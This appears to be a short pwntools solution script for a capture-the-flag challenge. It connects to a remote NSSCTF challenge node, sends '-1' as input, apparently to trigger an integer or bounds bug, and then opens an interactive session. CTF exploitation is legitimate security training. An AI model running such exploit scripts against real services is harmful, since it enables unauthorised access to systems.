from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# io=process("./pwn")
io=remote("node3.anna.nssctf.cn",28525)

io.recvuntil(b")\n")
io.sendline(b"-1")

io.interactive()